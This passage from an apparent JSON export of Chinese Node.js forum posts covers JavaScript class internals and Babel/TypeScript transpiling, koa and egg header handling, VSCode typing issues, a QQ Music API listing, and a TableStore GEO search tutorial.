   this.content = &#96;&lt;input type=&quot;text&quot; value=&quot;${value}&quot; &#x2F;&gt;&#96;;\n}\n</code></pre><p>如果想要 <code>InputField</code> 继承 <code>Component</code> 并能够调用它的 <code>render</code> 方法，就需要更改它的原型。当对子类的实例调用 <code>render</code>方法时，不希望在它的空原型中查找，而应该从从 <code>Component</code> 上的原型查找：</p>\n<pre class=\"prettyprint language-javascript\"><code>InputField.prototype = Object.create(new Component());\n</code></pre><p>通过这种方式，就可以在 <code>Component</code> 的原型中找到 <code>render</code> 方法。为了实现继承，需要将 <code>InputField</code> 的原型连接到 <code>Component</code> 的实例上，大多数库都使用 <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/setPrototypeOf\">Object.setPrototypeOf</a> 方法来实现这一点。</p>\n<p><img src=\"https://image.fundebug.com/2019-01-23-03.png\" alt></p>\n<p>然而，这不是唯一一件事要做的，每次继承一个类，需要:</p>\n<ul>\n<li>将子类的原型指向父类的实例。</li>\n<li>在子类构造函数中调用的父构造函数，完成父构造函数中的初始化逻辑。</li>\n</ul>\n<p>如上所述，如果希望继承基类的的所有特性，那么每次都需要执行这个复杂的逻辑。当创建多个类时，将逻辑封装在可重用函数中是有意义的。这就是开发人员最初解决基于类继承的方法——通过使用不同的库来模拟它。</p>\n<p>这些解决方案越来越流行，造成了 JS 中明显缺少了一些类型的现象。这就是为什么在 ECMAScript 2015 的第一个主要版本中引入了类，继承的新语法。</p>\n<h3>类的转换</h3>\n<p>当 ES6 或 ECMAScript 2015 中的新特性被提出时，JavaScript 开发人员不能等待所有引擎和浏览器都开始支持它们。为实现浏览器能够支持新的特性一个好方法是通过 <strong>转换 (Transpiling)</strong> ，它允许将 ECMAScript 2015 中编写的代码转换成任何浏览器都能理解的 JavaScript 代码，当然也包括使用基于类的继承编写类的转换功能。</p>\n<p><img src=\"https://image.fundebug.com/2019-01-23-04.png\" alt></p>\n<h3>Babel</h3>\n<p>最流行的 JavaScript 编译器之一就是 Babel，宏观来说，它分3个阶段运行代码：解析（parsing），转译（transforming），生成（generation），来看看它是如何转换的：</p>\n<pre class=\"prettyprint language-javascript\"><code>class Component {\n  constructor(content) {\n    this.content = content;\n  }\n\n  render() {\n      console.log(this.content)\n  }\n}\n\nconst component = new Component(&#x27;SessionStack&#x27;);\ncomponent.render();\n</code></pre><p>以下是 Babel 转换后的样式：</p>\n<pre class=\"prettyprint language-javascript\"><code>var Component = function () {\n  function Component(content) {\n    _classCallCheck(this, Component);\n    this.content = content;\n  }\n\n  _createClass(Component, [{\n    key: &#x27;render&#x27;,\n    value: function render() {\n      console.log(this.content);\n    }\n  }]);\n\n  return Component;\n}();\n</code></pre><p>如上所见，转换后的代码就可在任何浏览器执行了。 此外，还添加了一些功能， 这些是 Babel 标准库的一部分。</p>\n<p><code>_classCallCheck</code> 和<code>_createClass</code> 作为函数包含在编译文件中。</p>\n<ul>\n<li><code>_classCallCheck</code> 函数的作用在于确保构造方法永远不会作为函数被调用，它会评估函数的上下文是否为 <code>Component</code>对象的实例，以此确定是否需要抛出异常。</li>\n<li><code>_createClass</code> 用于处理创建对象属性，函数支持传入构造函数与需定义的键值对属性数组。函数判断传入的参数（普通方法/静态方法）是否为空对应到不同的处理流程上。</li>\n</ul>\n<p>为了探究继承的实现原理，分析继承的 <code>Component</code> 的 <code>InputField</code> 类。。</p>\n<pre class=\"prettyprint language-javascript\"><code>class InputField extends Component {\n    constructor(value) {\n        const content = &#96;&lt;input type=&quot;text&quot; value=&quot;${value}&quot; &#x2F;&gt;&#96;;\n        super(content);\n    }\n}\n</code></pre><p>使用 Babel 处理上述代码，得到如下代码：</p>\n<pre class=\"prettyprint language-javascript\"><code> var InputField = function (_Component) {\n _inherits(InputField, _Component);\n\n function InputField(value) {\n    _classCallCheck(this, InputField);\n\n    var content = &#x27;&lt;input type=&quot;text&quot; value=&quot;&#x27; + value + &#x27;&quot; &#x2F;&gt;&#x27;;\n    return _possibleConstructorReturn(this, (InputField.__proto__ || Object.getPrototypeOf(InputField)).call(this, content));\n  }\n\n  return InputField;\n}(Component);\n</code></pre><p>在本例中， Babel 创建了 <code>_inherits</code> 函数帮助实现继承。</p>\n<p>以 ES6 转 ES5 为例，具体过程：</p>\n<ul>\n<li>编写ES6代码</li>\n<li>babylon 进行解析</li>\n<li>解析得到 AST</li>\n<li>plugin 用 babel-traverse 对 AST 树进行遍历转译</li>\n<li>得到新的 AST树</li>\n<li>用 babel-generator 通过 AST 树生成 ES5 代码</li>\n</ul>\n<p><strong>代码部署后可能存在的BUG没法实时知道，事后为了解决这些BUG，花了大量的时间进行log 调试，这边顺便给大家推荐一个好用的BUG监控工具 <a href=\"https://www.fundebug.com/?utm_source=xiaozhi\">Fundebug</a>。</strong></p>\n<h3>Babel 中的抽象语法树</h3>\n<p>AST 包含多个节点，且每个节点只有一个父节点。 在 Babel 中，每个形状树的节点包含可视化类型、位置、在树中的连接等信息。 有不同类型的节点，如 <code>string</code>，<code>numbers</code>，<code>null</code>等，还有用于流控制<code>（if）</code>和循环<code>（for，while）</code>的语句节点。 并且还有一种特殊类型的节点用于类。它是基节点类的一个子节点，通过添加字段来扩展它，以存储对基类的引用和作为单独节点的类的主体。</p>\n<p>把下面的代码片段转换成一个抽象语法树:</p>\n<pre class=\"prettyprint language-javascript\"><code>class Component {\n  constructor(content) {\n    this.content = content;\n  }\n\n  render() {\n    console.log(this.content)\n  }\n}\n</code></pre><p>下面是以下代码片段的抽象语法树:</p>\n<p><img src=\"https://image.fundebug.com/2019-01-23-05.png\" alt></p>\n<p>Babel 的三个主要处理步骤分别是： 解析(parse)，转换 (transform)，生成 (generate)。</p>\n<h4>解析</h4>\n<p>将代码解析成抽象语法树（AST），每个js引擎（比如Chrome浏览器中的V8引擎）都有自己的AST解析器，而Babel是通过 Babylon 实现的。在解析过程中有两个阶段： 词法分析 和 语法分析 ，词法分析阶段把字符串形式的代码转换为 令牌 （tokens）流，令牌类似于AST中节点；而语法分析阶段则会把一个令牌流转换成 AST的形式，同时这个阶段会把令牌中的信息转换成AST的表述结构。</p>\n<h4>转换</h4>\n<p>在这个阶段，Babel接受得到AST并通过babel-traverse对其进行 <a href=\"https://en.wikipedia.org/wiki/Depth-first_search\">深度优先遍历</a>，在此过程中对节点进行添加、更新及移除操作。这部分也是Babel插件介入工作的部分。</p>\n<h4>生成</h4>\n<p>将经过转换的AST通过babel-generator再转换成js代码，过程就是 <a href=\"https://en.wikipedia.org/wiki/Depth-first_search\">深度优先遍历</a>整个AST，然后构建可以表示转换后代码的字符串。</p>\n<p>在上面的示例中，首先生成两个 <strong>MethodDefinition</strong> 节点的代码，然后生成类主体节点的代码，最后生成类声明节点的代码。</p>\n<h3>使用 TypeScript 进行转换</h3>\n<p>另一个利用转换的流行框架是 TypeScript。它引入了一种用于编写 JavaScript 应用程序的新语法，该语法被转换为任何浏览器或引擎都可以执行的 EMCAScript 5。下面是用 Typescript 实现 <code>Component</code> :</p>\n<pre class=\"prettyprint language-javascript\"><code>class Component {\n    content: string;\n    constructor(content: string) {\n        this.content = content;\n    }\n    render() {\n        console.log(this.content)\n    }\n}\n</code></pre><p>转成抽象语法树如下：</p>\n<p><img src=\"https://image.fundebug.com/2019-01-23-06.png\" alt></p>\n<p>Typescript 还支持继承：</p>\n<pre class=\"prettyprint language-javascript\"><code>class InputField extends Component {\n    constructor(value: string) {\n        const content = &#96;&lt;input type=&quot;text&quot; value=&quot;${value}&quot; &#x2F;&gt;&#96;;\n        super(content);\n    }\n}\n</code></pre><p>以下是转换结果：</p>\n<pre class=\"prettyprint language-javascript\"><code>var InputField = &#x2F;** @class *&#x2F; (function (_super) {\n    __extends(InputField, _super);\n    function InputField(value) {\n        var _this = this;\n        var content = &quot;&lt;input type=\\&quot;text\\&quot; value=\\&quot;&quot; + value + &quot;\\&quot; &#x2F;&gt;&quot;;\n        _this = _super.call(this, content) || this;\n        return _this;\n    }\n    return InputField;\n}(Component));\n</code></pre><p>最终的结果还是 ECMAScript 5 代码，其中包含 <strong>TypeScript</strong> 库中的一些函数。封 <code>__extends</code> 中的逻辑与在第一节中讨论的逻辑相同。</p>\n<p>随着 Babel 和 TypeScript 被广泛采用，标准类和基于类的继承成为了构造 JavaScript 应用程序的标准方式，这推动了在浏览器中引入对类的原生支持。</p>\n<h3>类的原生支持</h3>\n<p>2014年，Chrome 引入了对 <a href=\"https://www.chromestatus.com/feature/4633745457938432\">类的原生支持</a>，这允许在不需要任何库或转换器的情况下执行类声明语法。</p>\n<p><img src=\"https://image.fundebug.com/2019-01-23-07.png\" alt></p>\n<p>本地实现类的过程就是我们所说的语法糖。这只是一种奇特的语法，它可以编译成语言中已经支持的相同的原语。可以使用新的易于使用的类定义，但是它仍然会创建构造函数和分配原型。</p>\n<p><img src=\"https://image.fundebug.com/2019-01-23-08.png\" alt></p>\n<h3>V8的支持</h3>\n<p>撯着，看看在 V8 中对 ECMAScript 2015 类的本机支持的工作原理。正如在 <a href=\"https://segmentfault.com/a/1190000017961297\">前一篇文章</a> 中所讨论的，首先必须将新语法解析为有效的 JavaScript 代码并添加到 AST 中，因此，作为类定义的结果，一个具有<a href=\"https://github.com/v8/v8/blob/a86fa968136f0ec6237f51a0d535fbd932868d4d/src/ast/ast.h#L2421\">ClassLiteral</a> 类型的新节点被添加到树中。</p>\n<p>这个节点存储了一些信息。首先，它将构造函数作为一个单独的函数保存，还保存类属性的列表，这些属性包括 方法、getter、setter、公共字段或私有字段。该节点还存储对父类的引用，该类将继承父类，而父类将再次存储构造函数、属性列表和父类。</p>\n<p>一旦这个新的类 <strong>ClassLiteral</strong> 被 <a href=\"https://github.com/v8/v8/blob/be3a1df9008ee78d1101855d3044db54a203f515/src/interpreter/bytecode-generator.cc#L1818\">转换成代码</a>，它又被转换成函数和原型。</p>\n<p><strong>原文：<a href=\"https://blog.sessionstack.com/how-javascript-works-the-internals-of-classes-and-inheritance-transpiling-in-babel-and-113612cdc220\">How JavaScript works: The internals of classes and inheritance + transpiling in Babel and TypeScript</a></strong></p>\n<h3>关于Fundebug</h3>\n<p><a href=\"https://www.fundebug.com/\">Fundebug</a>专注于JavaScript、微信小程序、微信小游戏、支付宝小程序、React Native、Node.js和Java线上应用实时BUG监控。 自从2016年双十一正式上线，Fundebug累计处理了9亿+错误事件，付费客户有Google、360、金山软件、百姓网等众多品牌企业。欢迎大家<a href=\"https://www.fundebug.com/team/create\">免费试用</a>！</p>\n<p><img src=\"https://static.fundebug.cn/wechat_slogan.png\" alt></p>\n</div>","title":"JavaScript是如何工作的：深入类和继承内部原理 + Babel和TypeScript 之间转换","last_reply_at":"2019-01-24T06:20:23.864Z","good":false,"top":false,"reply_count":2,"visit_count":707,"create_at":"2019-01-24T02:15:47.950Z","author":{"loginname":"Fundebug","avatar_url":"https://avatars2.githubusercontent.com/u/26496557?v=4&s=120"}},{"id":"5c4852593b948a2b4ab70e13","author_id":"5bd3c321ad50495f5e2fbbaf","tab":"ask","content":"<div class=\"markdown-text\"><h1>vscode 不能识别部分包</h1>\n<p>我是做CocosCreator开发的, NodeJS主要用于写辅助脚本工具, 感觉TypeScript比JavaScript好用, 就用<code>ts-node</code>做ts文件的解释器, 直接跑脚本.</p>\n<p>我最近遇到的问题是, 在脚本同目录下, 创建<code>tsconfig.json</code>文件, 把target设置为<code>es6</code>, vscode 就不能识别 commander和chalk包, 但能识别 fs-extra.</p>\n<p>用ts-node执行是能正常运行的, 只是vscode不能识别.</p>\n<p>把target改为<code>es5</code>, vscode就能识别; 使用<code>es6</code> 是为了不用在每个文件里导入<code>es6-promise</code>, 目前我就是把<code>tsconfig.json</code>删掉来避开这个问题的. 但还是想正面问题, 解决问题.</p>\n<p>我把<code>node_modules</code>放在分区根目录, 不用每个项目都 <code>npm install</code> 安装常用包, 我之前怀疑过是这个的问题, 但是在脚本同级目录下 npm 安装包也是出现同样的问题, 看来不是这个原因.</p>\n<p>commander 和 chalk 这两个包是有个特殊的地方, 例如chalk包:\n<code>node_modules/@types/chalk</code>下是没有d.ts文件的, README.md里写到</p>\n<pre class=\"prettyprint language-md\"><code>This is a stub types definition for chalk (https:&#x2F;&#x2F;github.com&#x2F;chalk&#x2F;chalk).\nchalk provides its own type definitions, so you don&#x27;t need @types&#x2F;chalk installed!\n</code></pre><p>d.ts文件被放在了 <code>node_modules\\chalk\\types</code>目录下.</p>\n<p>我感觉是跟这个有关系, 但没有想到如何解决这个问题.</p>\n<h1>环境信息:</h1>\n<ul>\n<li>操作系统: windows 10;</li>\n<li>vscode版本: v1.30.2;</li>\n<li>node版本: v10.15.0;</li>\n<li>tsc版本: v3.1.4;</li>\n<li>ts-node版本: v7.0.1;</li>\n</ul>\n<p>希望能在这里找到答案.</p>\n</div>","title":"[已解决]在tsconfig.json中配置target为es6, vscode 不能识别部分包","last_reply_at":"2019-01-24T03:30:24.621Z","good":false,"top":false,"reply_count":4,"visit_count":769,"create_at":"2019-01-23T11:39:05.787Z","author":{"loginname":"LazyCushion","avatar_url":"https://avatars1.githubusercontent.com/u/18256913?v=4&s=120"}},{"id":"5c45cd726955112b99437700","author_id":"5bf4f632e6481c5709f5dd0d","tab":"share","content":"<div class=\"markdown-text\"><p>今天做egg的调试的时候偶然发现了header和headers，想了想这是什么东西？\negg是在koa上进行封装的，读了大神写的koa的源码剖析：<a href=\"https://github.com/berwin/Blog/issues/8\">https://github.com/berwin/Blog/issues/8</a></p>\n<pre class=\"prettyprint language-js\"><code>var delegate = require(&#x27;delegates&#x27;);\nvar proto = module.exports = {}; &#x2F;&#x2F; 一些自身方法，被我删了\n\n&#x2F;**\n * Response delegation.\n *&#x2F;\n\ndelegate(proto, &#x27;response&#x27;)\n  .method(&#x27;attachment&#x27;)\n  .method(&#x27;redirect&#x27;)\n  .method(&#x27;remove&#x27;)\n  .method(&#x27;vary&#x27;)\n  .method(&#x27;set&#x27;)\n  .method(&#x27;append&#x27;)\n  .access(&#x27;status&#x27;)\n  .access(&#x27;message&#x27;)\n  .access(&#x27;body&#x27;)\n  .access(&#x27;length&#x27;)\n  .access(&#x27;type&#x27;)\n  .access(&#x27;lastModified&#x27;)\n  .access(&#x27;etag&#x27;)\n  .getter(&#x27;headerSent&#x27;)\n  .getter(&#x27;writable&#x27;);\n\n&#x2F;**\n * Request delegation.\n *&#x2F;\n\ndelegate(proto, &#x27;request&#x27;)\n  .method(&#x27;acceptsLanguages&#x27;)\n  .method(&#x27;acceptsEncodings&#x27;)\n  .method(&#x27;acceptsCharsets&#x27;)\n  .method(&#x27;accepts&#x27;)\n  .method(&#x27;get&#x27;)\n  .method(&#x27;is&#x27;)\n  .access(&#x27;querystring&#x27;)\n  .access(&#x27;idempotent&#x27;)\n  .access(&#x27;socket&#x27;)\n  .access(&#x27;search&#x27;)\n  .access(&#x27;method&#x27;)\n  .access(&#x27;query&#x27;)\n  .access(&#x27;path&#x27;)\n  .access(&#x27;url&#x27;)\n  .getter(&#x27;origin&#x27;)\n  .getter(&#x27;href&#x27;)\n  .getter(&#x27;subdomains&#x27;)\n  .getter(&#x27;protocol&#x27;)\n  .getter(&#x27;host&#x27;)\n  .getter(&#x27;hostname&#x27;)\n  .getter(&#x27;header&#x27;)\n  .getter(&#x27;headers&#x27;)\n  .getter(&#x27;secure&#x27;)\n  .getter(&#x27;stale&#x27;)\n  .getter(&#x27;fresh&#x27;)\n  .getter(&#x27;ips&#x27;)\n  .getter(&#x27;ip&#x27;);\n</code></pre><p>Context中有两部分，一部分是自身属性，主要是应用于框架内部使用，一部分是Request和Response委托的操作方法，主要为提供给用户更方便从Request获取想要的参数和更方便的设置Response内容。\n由此找到koa的源码：</p>\n<pre class=\"prettyprint language-js\"><code> &#x2F;**\n   * Return request header.\n   *\n   * [@return](&#x2F;user&#x2F;return) {Object}\n   * [@api](&#x2F;user&#x2F;api) public\n   *&#x2F;\n\n  get header() {\n    return this.req.headers;\n  },\n\n  &#x2F;**\n   * Set request header.\n   *\n   * [@api](&#x2F;user&#x2F;api) public\n   *&#x2F;\n\n  set header(val) {\n    this.req.headers = val;\n  },\n\n  &#x2F;**\n   * Return request header, alias as request.header\n   *\n   * [@return](&#x2F;user&#x2F;return) {Object}\n   * [@api](&#x2F;user&#x2F;api) public\n   *&#x2F;\n\n  get headers() {\n    return this.req.headers;\n  },\n\n  &#x2F;**\n   * Set request header, alias as request.header\n   *\n   * [@api](&#x2F;user&#x2F;api) public\n   *&#x2F;\n\n  set headers(val) {\n    this.req.headers = val;\n  },\n</code></pre><p>只是alias而已，\n那么在egg中要怎么进行使用呢？\negg的官方文档也给出了详细的介绍：<a href=\"https://eggjs.org/zh-cn/basics/controller.html#header\">https://eggjs.org/zh-cn/basics/controller.html#header</a>\n除了从 URL 和请求 body 上获取参数之外，还有许多参数是通过请求 header 传递的。框架提供了一些辅助属性和方法来获取。</p>\n<p>ctx.headers，ctx.header，ctx.request.headers，ctx.request.header：这几个方法是等价的，都是获取整个 header 对象。\nctx.get(name)，ctx.request.get(name)：获取请求 header 中的一个字段的值，如果这个字段不存在，会返回空字符串。\n我们建议用 ctx.get(name) 而不是 ctx.headers[‘name’]，因为前者会自动处理大小写。\n由于 header 比较特殊，有一些是 HTTP 协议规定了具体含义的（例如 Content-Type，Accept），有些是反向代理设置的，已经约定俗成（X-Forwarded-For），框架也会对他们增加一些便捷的 getter，详细的 getter 可以查看 API 文档。</p>\n<p>特别是如果我们通过 config.proxy = true 设置了应用部署在反向代理（Nginx）之后，有一些 Getter 的内部处理会发生改变。</p>\n<p>此处egg的文档还给出了一点需要注意的：\n就是进行代理的时候会有一些改变。\n详细的信息可以参照上面的链接，大家可以读一下~</p>\n<blockquote>\n<p>附上一条招聘信息：\n地点：郑州  公司：中移在线服务有限公司\n职位：前端 or node\nnode方面主要推进微服务落地，技术：egg，koa，express，react\n投递邮箱：zhenghongfei@cmos.chinamobile.com</p>\n</blockquote>\n</div>","title":"koa中的headers和heaer以及egg中的使用","last_reply_at":"2019-01-24T03:05:45.129Z","good":false,"top":false,"reply_count":4,"visit_count":775,"create_at":"2019-01-21T13:47:30.658Z","author":{"loginname":"zheng199512","avatar_url":"https://avatars1.githubusercontent.com/u/29241175?v=4&s=120"}},{"id":"5c0de2ea7ec239239ff55355","author_id":"5a3075929807389a1809f330","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>效果以及原文： <a href=\"https://unnue.com/article/46\">https://unnue.com/article/46</a></p>\n</blockquote>\n<h4>播放地址</h4>\n<pre class=\"prettyprint language- html\"><code>https:&#x2F;&#x2F;api.bzqll.com&#x2F;music&#x2F;tencent&#x2F;url?id=002GrJ771EmliH&amp;key=579621905&amp;br=320\n</code></pre><ul>\n<li>请求方式： GET</li>\n<li>参数\nid: 歌曲id，播放列表可以右键查看\nkey: 默认值 579621905\nbr: 码率 默认最大码率 即最高音质 320</li>\n<li>返回 302\n说明： 302 之后实际播放地址中，歌曲id 前的 C1、C2等为音质</li>\n</ul>\n<h4>歌曲搜索</h4>\n<pre class=\"prettyprint language- html\"><code>https:&#x2F;&#x2F;api.bzqll.com&#x2F;music&#x2F;tencent&#x2F;search?key=579621905&amp;s=秦时明月&amp;limit=100&amp;offset=0&amp;type=song\n</code></pre><ul>\n<li>请求方式： GET</li>\n<li>参数</li>\n</ul>\n<p>&lt;table border=“1” cellspacing=“0” cellpadding=“0”  class=“temp-table”&gt;\n\t&lt;thead&gt;&lt;tr&gt;&lt;th&gt;参数说明&lt;/th&gt;\n\t\t\t&lt;th&gt;是否必须&lt;/th&gt;\n\t\t\t&lt;th&gt;说明&lt;/th&gt;\n\t\t\t&lt;th&gt;默认值&lt;/th&gt;\n\t\t&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;key&lt;/td&gt;\n\t\t\t&lt;td&gt;√&lt;/td&gt;\n\t\t\t&lt;td&gt;请求秘钥，QQ群号&lt;/td&gt;\n\t\t\t&lt;td&gt;579621905&lt;/td&gt;\n\t\t&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;s&lt;/td&gt;\n\t\t\t&lt;td&gt;√&lt;/td&gt;\n\t\t\t&lt;td&gt;搜索关键词&lt;/td&gt;\n\t\t\t&lt;td&gt;无&lt;/td&gt;\n\t\t&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;type&lt;/td&gt;\n\t\t\t&lt;td&gt;√&lt;/td&gt;\n\t\t\t&lt;td&gt;搜索类型&lt;/td&gt;\n\t\t\t&lt;td&gt;默认为搜索音乐&lt;/td&gt;\n\t\t&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;limit&lt;/td&gt;\n\t\t\t&lt;td&gt;×&lt;/td&gt;\n\t\t\t&lt;td&gt;搜索结果数量&lt;/td&gt;\n\t\t\t&lt;td&gt;默认为 100&lt;/td&gt;\n\t\t&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;offset&lt;/td&gt;\n\t\t\t&lt;td&gt;×&lt;/td&gt;\n\t\t\t&lt;td&gt;搜索结果页数&lt;/td&gt;\n\t\t\t&lt;td&gt;默认为第1页&lt;/td&gt;\n\t\t&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;</p>\n<ul>\n<li>说明\n当前搜索类型支持:</li>\n</ul>\n<ol>\n<li>音乐搜索:type=song</li>\n<li>专辑搜索:type=album</li>\n<li>歌单搜索:type=list (QQ音乐限制歌单每页最多查询50条)</li>\n<li>MV搜索:type=mv</li>\n<li>用户搜索:type=user</li>\n<li>歌词搜索:type=lrc</li>\n</ol>\n<blockquote>\n<p>效果以及原文： <a href=\"https://unnue.com/article/46\">https://unnue.com/article/46</a></p>\n</blockquote>\n</div>","title":"QQ音乐播放地址 API","last_reply_at":"2019-01-24T00:58:44.111Z","good":false,"top":false,"reply_count":6,"visit_count":1607,"create_at":"2018-12-10T03:52:10.237Z","author":{"loginname":"varscc","avatar_url":"https://avatars3.githubusercontent.com/u/32264346?v=4&s=120"}},{"id":"5c4543ab3b948a2b4ab6fef1","author_id":"5822c75ce885ce5a39382748","tab":"ask","content":"<div class=\"markdown-text\"><p>这样写在回调里就ctx.body就没有了，直接在外面有返回</p>\n<pre class=\"prettyprint\"><code>const {BosClient, MimeType} = require(&#x27;bce-sdk-js&#x27;)\nconst fs = require(&#x27;fs&#x27;)\nconst path = require(&#x27;path&#x27;)\n\nfunction upload(ctx) {\n  const uploadFilePath = ctx.request.body.path;\n  const file = ctx.request.files.file;\n\n  &#x2F;&#x2F; 创建可读流\n  const reader = fs.createReadStream(file.path);\n  let filePath = path.join(&#x27;static&#x2F;upload&#x2F;&#x27;) + &#96;${file.name}&#96;;\n  &#x2F;&#x2F; 创建可写流\n  const upStream = fs.createWriteStream(filePath);\n  &#x2F;&#x2F; 可读流通过管道写入可写流\n  reader.pipe(upStream);\n\n  const bucket = &#x27;tp-statics&#x27;;\n  const endpoint = &#x27;xxx&#x27;;\n  const config = {\n    endpoint, &#x2F;&#x2F;传入Bucket所在区域域名\n    credentials: {\n      ak: &#x27;xxx&#x27;, &#x2F;&#x2F; 您的AccessKey\n      sk: &#x27;xxx&#x27; &#x2F;&#x2F; 您的SecretAccessKey\n    }\n  };\n\n  const client = new BosClient(config);\n  &#x2F;&#x2F; 上传路径+文件名\n  const key = uploadFilePath + file.name;\n  const ext = key.split(&#x2F;\\.&#x2F;g).pop();\n  &#x2F;&#x2F; 检查类型\n  let mimeType = MimeType.guess(ext);\n  if (&#x2F;^text\\&#x2F;&#x2F;.test(mimeType)) mimeType += &#x27;; charset=UTF-8&#x27;;\n  const options = {\n    &#x27;Content-Type&#x27;: mimeType\n  };\n\n\n  reader.on(&quot;close&quot;, () =&gt; {\n    &#x2F;&#x2F;   console.log(&quot;流关闭了~~~&quot;);\n    client.putObjectFromFile(bucket, key, filePath, options).then(res =&gt; {\n      ctx.body = {\n        code: 200,\n        data: {\n          domain: &#x27;https:&#x2F;&#x2F;xxx&#x27;,\n          key,\n          url: &#96;https:&#x2F;&#x2F;xxx&#x2F;${key}&#96;\n        },\n        message: &#x27;上传成功&#x27;\n      }\n    }).catch(err =&gt; {\n      ctx.body = {\n        code: 500,\n        message: err\n      }\n    })\n  });\n}\n</code></pre></div>","title":"koa-router 回调中ctx.body返回无效","last_reply_at":"2019-01-24T00:49:57.287Z","good":false,"top":false,"reply_count":4,"visit_count":682,"create_at":"2019-01-21T03:59:39.914Z","author":{"loginname":"WangSiTu","avatar_url":"https://avatars1.githubusercontent.com/u/17542189?v=4&s=120"}},{"id":"5c46ed903b948a2b4ab70843","author_id":"5942903bff5813233faad8a9","tab":"ask","content":"<div class=\"markdown-text\"><p>研究一下午，采取的方式是</p>\n<pre class=\"prettyprint\"><code>&#x2F;&#x2F; 使用cluster\n    const app = mm.cluster({\n      workers: 2,\n      sticky: true,\n    });\n    app.ready().then(()=&gt;{\n\t&#x2F;&#x2F; assert and done()\n\t});\n</code></pre><p>git翻了翻，也没找到一个列子，想问下，有没有其他的更好的办法。</p>\n</div>","title":"egg的socket.io，诸位是如何写mocha测试的？","last_reply_at":"2019-01-23T10:23:01.537Z","good":false,"top":false,"reply_count":1,"visit_count":721,"create_at":"2019-01-22T10:16:48.691Z","author":{"loginname":"wbget","avatar_url":"https://avatars0.githubusercontent.com/u/12776391?v=4&s=120"}},{"id":"5c3c781f3898674067a7f10e","author_id":"58130d10b37ee8fb339788cf","tab":"share","content":"<div class=\"markdown-text\"><h1>一、方案背景</h1>\n<p>对于一套GEO管理系统，其核心点与瓶颈在于数据库的存储性能与查询能力；一方面，存储服务需要应对海量数据的低延迟存、读，另一方面，存储服务也要提供高效的GEO+多维度数据检索。表格存储（TableStore），作为一款Serverless分布式NoSQL数据库，完全具备该系统的需求。\n下面我们将基于TableStore打造一个【亿量级GEO管理系统】；</p>\n<h2>需求场景</h2>\n<p>某店铺搜索平台，提供了亿量级的店铺信息。用户通过平台提供的PC端、移动端网页，按照自己的需求维度组合，搜索用户心仪的店铺。平台需要在地图上展示店铺的具体位置、店铺详细信息、店铺主页的跳转；\n维度一：【距离1km内】【人均100以内】【评分最高】【奶茶店】；\n维度二：【杭州市内】【评分最高的】【沈家*】店铺；\n…\n实现快速、多维GEO查询功能，是GEO管理解决方案的核心功能，样例如下：\n<strong>注：该样例提供了【亿量级】店铺数据。官网控制台样例地址：</strong><a href=\"https://ots.console.aliyun.com/index#/demo/cn-hangzhou/geo\">项目样例</a></p>\n<p><img src=\"https://yqfile.alicdn.com/c9ab5efa61a3e8747d513a849e6282fe422b8811.gif\" alt=\"testGeo\"></p>\n<p>基于表格存储搭建的店铺搜索系统页面一览，样例内嵌在表格存储控制台中，用户可登录控制台体验系统（若为表格存储的新用户，需要点击开通服务后体验，开通免费，订单数据存储在公共实例中，体验不消耗用户存储、流量、Cu）。</p>\n<h2>表格存储（TableStore）方案</h2>\n<p>使用表格存储（TableStore）研发的多元索引（SearchIndex）方案，可以轻松搭建一套：亿量级店铺搜索系统。多元索引功能可以创建GEO索引、分词字符串索引等，为用户提供了GEO检索、多维组合检索等能力，用户可随时创建，存量、增量数据自动同步。\nTableStore作为阿里云提供的一款全托管、零运维的分布式NoSql型数据存储服务，具有【海量数据存储】、【热点数据自动分片】、【海量数据多维检索】等功能，有效的地解决了GEO数据量大膨胀这一挑战；\n用户可以仅在需要的时候创建、开通索引。由TableStore来保证数据同步的一致性，这极大的降低了用户的方案设计、服务运维、代码开发等工作量。</p>\n<h1>二、搭建准备</h1>\n<p>若您对于基于TableStore实现的【亿量级店铺搜索系统】体验不错，并希望开始自己系统的搭建之旅，只需按照如下步骤便可以着手搭建了：</p>\n<h2>1、开通表格存储</h2>\n<p>通过控制台开通表格存储服务，表格存储即开即用（后付费），采用按量付费方式，已为用户提供足够功能测试的免费额度。<a href=\"https://ots.console.aliyun.com/\">表格存储官网控制台</a>、<a href=\"https://help.aliyun.com/document_detail/52733.html\">免费额度说明</a>。</p>\n<h2>2、创建实例</h2>\n<p>通过控制台创建表格存储实例，选择支持多元索引的Region。（当前阶段SearchIndex功能尚未商业化，暂时开放北京，上海，杭州和深圳四地，其余地区将逐渐开放）</p>\n<p><img src=\"https://cdn.nlark.com/lark/0/2018/png/97467/1539915875520-18e33218-3d60-4b3a-8ff9-05ced52aab73.png\" alt=\"image | left\"></p>\n<p>创建实例后，提交工单申请多元索引功能邀测（商业化后默认打开，不使用不收费）。</p>\n<ul>\n<li>邀测地址：<a href=\"https://workorder.console.aliyun.com/console.htm#/ticket/add?productCode=ots&amp;commonQuestionId=1402&amp;isSmart=true\">提工单</a>，选择【表格存储】&gt;【产品功能、特性咨询】&gt;【创建工单】，申请内容如下：</li>\n<li>问题描述:请填写【申请SearchIndex邀测】</li>\n<li>机密信息:请填写【地域+实例名】，例：上海+myInstanceName</li>\n</ul>\n<p><img src=\"https://cdn.nlark.com/lark/0/2018/png/97467/1539915294761-f6527b3e-3a87-47a8-a5ee-abe07cae3fc1.png\" alt=\"image | left\"></p>\n<h2>3、SDK下载</h2>\n<p>使用具有多元索引（SearchIndex）的SDK，<a href=\"https://help.aliyun.com/document_detail/86528.html\">官网地址</a>，暂时java、go、node.js三种SDK增加了新功能</p>\n<h4>java-SDK</h4>\n<pre class=\"prettyprint language-xml\"><code>&lt;dependency&gt;\n    &lt;groupId&gt;com.aliyun.openservices&lt;&#x2F;groupId&gt;\n    &lt;artifactId&gt;tablestore&lt;&#x2F;artifactId&gt;\n    &lt;version&gt;4.8.0&lt;&#x2F;version&gt;\n&lt;&#x2F;dependency&gt;\n</code></pre><h4>go-SDK</h4>\n<pre class=\"prettyprint language-bash\"><code>$ go get github.com&#x2F;aliyun&#x2F;aliyun-tablestore-go-sdk\n</code></pre><h4>Nodejs-SDK</h4>\n<pre 